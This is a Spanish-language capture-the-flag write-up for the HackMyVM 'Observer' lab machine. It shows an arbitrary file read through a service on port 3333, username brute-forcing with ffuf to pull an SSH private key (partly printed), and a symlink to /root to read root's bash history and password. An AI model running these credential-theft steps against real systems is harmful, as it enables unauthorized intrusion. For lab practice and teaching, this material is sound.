---
layout: post
title: Observer - Hackmyvm
tags: [ctf, hackmyvm]
---

**Autor**: Sml \\
**Dificultad**: Fácil

![img](../imgs/write-ups/hackmyvm/observer/observer.png)

## Enumeración

Lo primero es realizar una enumeración de los puertos abiertos.

```
h3rshel@kali:~/Desktop$ sudo nmap -p- 192.168.1.21
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-04 12:07 CEST
Nmap scan report for 192.168.1.21
Host is up (0.00015s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
3333/tcp open  dec-notes
MAC Address: 08:00:27:97:34:08 (Oracle VirtualBox virtual NIC)
```

### 3333

Utilizando la herramienta **curl** hago una petición al servidor en el puerto **3333**.

```
h3rshel@kali:~/Desktop$ curl 192.168.1.21:3333
OBSERVING FILE: /home/ NOT EXIST 


<!-- KJyiXJrscctNswYNsGRussVmaozFZBHMV -->

h3rshel@kali:~/Desktop$ curl 192.168.1.21:3333/test
OBSERVING FILE: /home/test NOT EXIST


<!-- XVlBzgbaiCMRAjWwhTHctcuAxhxKQFHMV -->
```

Como se puede ver, el servidor intenta leer un archivo dentro de "/home" con la ruta que le hemos pasado.

## Explotación

Mediante **ffuf**, hago un ataque de fuerza bruta para intentar leer claves privadas probando distintos nombres de usuarios.

```
h3rshel@kali:~/Desktop$ ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u "http://192.168.1.21:3333/FUZZ/.ssh/id_rsa" -fw 8 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.1.21:3333/FUZZ/.ssh/id_rsa
 :: Wordlist         : FUZZ: /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response words: 8
________________________________________________

[Status: 200, Size: 2602, Words: 7, Lines: 39, Duration: 5ms]
    * FUZZ: jan
```
Ha encontrado un usuario!!

```
h3rshel@kali:~/Desktop$ curl 192.168.1.21:3333/jan/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA6Tzy2uBhFIRLYnINwYIinc+8TqNZap0CB7Ol3HSnBK9Ba9pGOSMT
Xy2J8eReFlni3MD5NYpgmA67cJAP3hjL9hDSZK2UaE0yXH4TijjCwy7C4TGlW49M8Mz7b1
LsH5BDUWZKyHG/YRhazCbslVkrVFjK9kxhWrt1inowgv2Ctn4kQWDPj1gPesFOjLUMPxv8
fHoutqwKKMcZ37qePzd7ifP2wiCxlypu0d2z17vblgGjI249E9Aa+/hKHOBc6ayJtwAXwc
ivKmNrJyrSLKo+xIgjF5uV0grej1XM/bXjv39Z8XF9h4FEnsfzUN4MmL+g8oclsaO5wgax
ptRXdZxslsxr4T9AwzeTSDPejR0AzdUk34dYHj2n1bWzGl5bgs3FJWX0yAaLvcc/QuHJyy
[...]
-----END OPENSSH PRIVATE KEY-----
```

## Escalado de privilegios

Me conecto a la máquina utilizando la clave privada.

```
h3rshel@kali:~/Desktop$ ssh jan@192.168.1.21 -i id_rsa   
[...]
Last login: Mon Aug 21 20:21:22 2023 from 192.168.0.100
jan@observer:~$ :)
```

Puedo ejecutar el siguiente comando con permisos de root. No me permite escalar privilegios pero puedo ver una tarea cron que ejecuta "/opt/observer".

```
jan@observer:/opt$ sudo /usr/bin/systemctl -l status
● observer
    State: running
    Units: 235 loaded (incl. loaded aliases)
     Jobs: 0 queued
   Failed: 0 units
    Since: Mon 2023-09-04 12:06:42 CEST; 20min ago
  systemd: 252.12-1~deb12u1
   CGroup: /
           ├─init.scope
           │ └─1 /sbin/init
           ├─system.slice
           │ ├─cron.service
           │ │ ├─428 /usr/sbin/cron -f
           │ │ ├─437 /usr/sbin/CRON -f
           │ │ ├─441 /bin/sh -c /opt/observer          <------ Esta tarea
           │ │ └─442 /opt/observer
           │ ├─dbus.service
           │ │ └─430 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --s>
           │ ├─ifup@enp0s3.service
           │ │ └─376 dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df>
           │ ├─ssh.service
           │ │ └─448 "sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"
           │ ├─system-getty.slice
           │ │ └─getty@tty1.service
           │ │   └─446 /sbin/agetty -o "-p -- \\u" --noclear - linux
           │ ├─systemd-journald.service
           │ │ └─214 /lib/systemd/systemd-journald

```

Probablemente el ejecutable **/opt/observer** sea el servicio que se está ejecutando en el puerto 3333, con el cual se pueden leer archivos.

Si este servicio se está ejecutando como usuario **root** es posible usar **soft links** para leer su clave privada u otros archivos.

Con el siguiente comando creo un soft link al directorio /root
```
jan@observer:~$ ln -s /root root
```

Tras probar, descubro que el usuario root no tiene clave id_rsa pero sí que puedo leer su historial de comandos en el que descubro que está guardada su contraseña.

```
h3rshel@kali:~/Desktop$ curl 192.168.1.21:3333/jan/root/.bash_history
ip a
exit
apt-get update && apt-get upgrade
apt-get install sudo
cd
wget https://go.dev/dl/go1.12.linux-amd64.tar.gz
tar -C /usr/local -xzf go1.12.linux-amd64.tar.gz
rm go1.12.linux-amd64.tar.gz 
export PATH=$PATH:/usr/local/go/bin
nano observer.go
go build observer.go 
mv observer /opt
ls -l /opt/observer 
crontab -e
nano root.txt
chmod 600 root.txt 
nano /etc/sudoers
nano /etc/ssh/sshd_config
paswd
fuck************
```

Ahora con la contraseña puedo iniciar sesión con el comando **su**.

```
jan@observer:~$ su root
Contraseña: 
root@observer:/home/jan# :)
```

Muchas gracias a **Sml** por esta máquina.

